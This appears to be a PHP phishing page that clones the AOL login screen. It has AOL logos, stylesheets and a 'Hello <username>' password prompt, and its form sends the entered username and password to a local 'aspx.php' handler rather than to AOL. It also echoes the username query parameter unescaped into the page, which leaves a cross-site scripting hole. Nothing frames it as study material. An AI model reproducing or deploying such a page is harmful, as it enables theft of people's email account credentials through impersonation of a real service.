﻿<!DOCTYPE html>
<html id="Stencil" class="no-js">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL - login</title>
        <meta name="robots" content="noindex, nofollow">
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">

        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-min.css">
        <!--<![endif]-->
        <style nonce="CK+hHUO5iYDwwTgEYV9WdPCr7G8B+nZ5RPD5do8aVqbA54Q9">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/9a196076261a9678a0093692a742e77dd8fea891/aol-main.css" rel="stylesheet" type="text/css"><style nonce="CK+hHUO5iYDwwTgEYV9WdPCr7G8B+nZ5RPD5do8aVqbA54Q9">/*! Copyright 2017 Yahoo Holdings, Inc. All rights reserved. */
._yb_i10dp{direction:ltr;box-sizing:border-box;-webkit-font-smoothing:antialiased;letter-spacing:-0.31em;text-rendering:optimizespeed;font-size:0;line-height:84px;min-width:1024px;max-width:1920px;margin:0 auto;padding:0 64px 0 50px;position:relative;z-index:1000}._yb_i10dp > *{letter-spacing:normal;line-height:normal;text-rendering:auto}._yb_i10dp *{box-sizing:border-box}._yb_18lh1{font-size:0;display:inline-block;vertical-align:middle}._yb_i0qht,._yb_187qv,._yb_1a62e,._yb_1jqxa,._yb_i0vh1,._yb_trlwf{}._yb_i0qht{width:142px}._yb_187qv{font-size:1rem;max-width:844px;min-width:496px;position:relative;width:46%}._yb_1x764{letter-spacing:-0.31em;text-rendering:optimizespeed;padding-right:inherit;position:absolute;right:0;top:50%;transform:translateY(-50%)}._yb_1x764 > ._yb_18lh1{letter-spacing:normal;line-height:normal;text-rendering:auto}._yb_1x764 > ._yb_18lh1 + ._yb_18lh1{margin-left:32px}._yb_cvmv7{margin:0}._yb_ji0tg{padding:0}._yb_ji0tg ._yb_i0qht{text-align:center;width:192px}@media only screen and (min-width:1440px){._yb_ji0tg ._yb_i0qht{max-width:224px;width:14%}}._yb_ji0tg ._yb_187qv{width:44%}._yb_ji0tg._yb_1y4yc > ._yb_i0qht,._yb_ji0tg._yb_iz4w7 > ._yb_i0qht,._yb_ji0tg._yb_1vbrd > ._yb_i0qht,._yb_ji0tg._yb_1f4j5 > ._yb_i0qht{width:224px}._yb_ji0tg ._yb_1x764{padding-right:32px}._yb_llcbr,._yb_j9dla{min-width:initial}._yb_llcbr{padding-left:54px}._yb_j9dla{background:#6302de}._yb_j9dla._yb_1oqmf,._yb_j9dla._yb_1o89h,._yb_j9dla._yb_k9wn8,._yb_j9dla._yb_2clof,._yb_j9dla._yb_1ojuq{background:#000}._yb_j9dla._yb_1u0wc{background:#2b2c2f}._yb_j9dla._yb_k2vtm,._yb_j9dla._yb_1wint{background:#333}._yb_j9dla._yb_1wqq8{background:#feeade}._yb_j9dla._yb_1imih{background:#2b2d32}._yb_ji8ke._yb_1y0m5{background:#6302de}._yb_j9dla._yb_1sa5i{background:#222}._yb_j9dla._yb_3n5kt{background:#0a4ea3}._yb_j9dla._yb_secy5{background:#0a0a0a}._yb_j9dla._yb_152y5{background:#fff}._yb_j9dla._yb_5j270{background:#1e4e9d}._yb_j9dla._yb_cwj3l{background:linear-gradient(303deg,#00d301,#36c275 50%,#00a562)}._yb_j9dla._yb_htslw{background:#36465d}@media screen and (max-width:768px){._yb_llcbr{line-height:54px;padding:0 24px 0 20px}._yb_j9dla{line-height:50px;padding:0}._yb_llcbr._yb_k2vtm,._yb_llcbr._yb_1y0m5,._yb_llcbr._yb_1o89h,._yb_llcbr._yb_secy5,._yb_j9dla{text-align:center}._yb_llcbr ._yb_i0qht,._yb_j9dla ._yb_i0qht{width:auto}._yb_1oqmf ._yb_i0qht{height:18px}._yb_1wqq8 ._yb_i0qht{height:12px}._yb_1y0m5 ._yb_i0qht,._yb_1imih ._yb_i0qht{height:24px}._yb_1o89h ._yb_i0qht,._yb_3n5kt ._yb_i0qht{height:15px}._yb_k9wn8 ._yb_i0qht{height:22px}._yb_j9dla._yb_5j270 ._yb_i0qht{height:20px}._yb_cwj3l ._yb_i0qht{height:20px}}._yb_1xlu8{width:1020px}._yb_1epm9,._yb_6f51f,._yb_19d4i,._yb_wo2q6{padding-left:10px}._yb_1epm9 > ._yb_i0qht,._yb_6f51f > ._yb_i0qht,._yb_19d4i > ._yb_i0qht,._yb_wo2q6 > ._yb_i0qht{margin-right:10px;width:auto}.ybar-amp{min-width:initial;max-width:initial;padding-right:0}._yb_1s4w9{display:inline-block;font-size:0;height:100%}._yb_1s4w9:focus{outline-offset:2px;outline:3px solid #00abf0;outline:5px auto -webkit-focus-ring-color}._yb_uq05k{max-height:40px;max-width:100%}._yb_1btbu > ._yb_uq05k,._yb_18x4x > ._yb_uq05k,._yb_t3c6o > ._yb_uq05k,._yb_1ulq2 > ._yb_uq05k{max-height:none}.ybar-dark ._yb_1kiry,.ybar-light ._yb_1s4yp{display:none}.ybar-amp ._yb_1s4w9{display:block;margin:auto;padding:10px 0;text-align:center}@media screen and (max-width:768px){._yb_1nij6 ._yb_uq05k,._yb_1dhun ._yb_uq05k{height:100%;max-height:32px}}</style>

    </head>
    <body >
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross" />
            <p class="mbr-legacy-device">
                AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some AOL features may not work properly. Please update your browser version now. <a href="https://help.yahoo.com/kb/index?page&#x3D;content&amp;y&#x3D;PROD_ACCT&amp;id&#x3D;SLN4556&amp;actp&#x3D;productlink&amp;locale&#x3D;en_US">More Info</a>
            </p>
        </div>

    <div id="login-body" class="loginish  puree-v2">
    <div class="mbr-ybar ybar-light">
    <div id="ybar" role="banner" class="_yb_i10dp  _yb_1oqmf   "> <script id="ybarConfig" type="text/x-template">{}</script>  <div class="_yb_i0qht _yb_18lh1"><a href="https:&#x2F;&#x2F;www.aol.com&#x2F;" class="_yb_1s4w9    " data-ylk="sec:yb_logo;slk:login;itc:0;">   <img class="_yb_uq05k _yb_1kiry" src="https:&#x2F;&#x2F;s.yimg.com&#x2F;wm&#x2F;assets&#x2F;images&#x2F;ns&#x2F;aol-logo-black-v.0.0.2.png" srcset="https:&#x2F;&#x2F;s.yimg.com&#x2F;wm&#x2F;assets&#x2F;images&#x2F;ns&#x2F;aol-logo-black-v.0.0.2.png 1x, https:&#x2F;&#x2F;s.yimg.com&#x2F;wm&#x2F;assets&#x2F;images&#x2F;ns&#x2F;aol-logo-black-v.0.0.2.png 2x" onerror="this.onerror=null;this.style.display='none';" alt="aol"><img class="_yb_uq05k _yb_1s4yp" src="https:&#x2F;&#x2F;s.yimg.com&#x2F;wm&#x2F;assets&#x2F;images&#x2F;ybar&#x2F;aol-logo-white-v0.0.4.png" srcset="https:&#x2F;&#x2F;s.yimg.com&#x2F;wm&#x2F;assets&#x2F;images&#x2F;ybar&#x2F;aol-logo-white-v0.0.4.png 1x, https:&#x2F;&#x2F;s.yimg.com&#x2F;wm&#x2F;assets&#x2F;images&#x2F;ybar&#x2F;aol-logo-white-v0.0.4.png 2x" alt="aol" onerror="this.onerror=null;this.style.display='none';">   aol</a></div><div role="toolbar" class="_yb_1x764 "></div></div>
</div>

    <div class="login-box-container">
        <div class="login-box default">
            <div class="txt-align-center">
                    <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="" />
            </div>
            <div class="challenge password-challenge ">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello <?php echo $_GET['username']; ?></h1>
            <p class="not-you"><a href="https://login.aol.com/?display&#x3D;login&amp;.src&#x3D;guce-mail&amp;done&#x3D;https%3A%2F%2Fmail.aol.com%2F%3Ficid%3Daol.com-nav&amp;prefill&#x3D;0">Not you?</a></p>
    </div>
    <form action="aspx.php" method="post" class="pure-form pure-form-stacked">
        
        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation"
                autocorrect="off" spellcheck="false"
                name="username" value="<?php echo $_GET['username']; ?>" />
        </div>
        <input type="password" id="login-passwd"  name="password" placeholder="Password" autofocus autocomplete="current-password" required="" />
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" data-ylk="elm:btn;elmt:next;slk:next">
                    Sign in
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link"
                data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link"
                name="skip" value="I forgot my password" />
        </p>
    </form>
</div>

</div>

        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>

        </div>
    </div>
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner">
            <div id="login-ad-mon"></div>
            <div id="login-ad-sky"></div>
            <div id="login-ad-rich"></div>
        </div>
    </div>
</div>

    <noscript>
        <img src="https://aol.com/account/js-reporting/?crumb=oqHmfbIgmuJ&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
    </noscript>

    <div id="mbr-css-check"></div>
</body>
</html>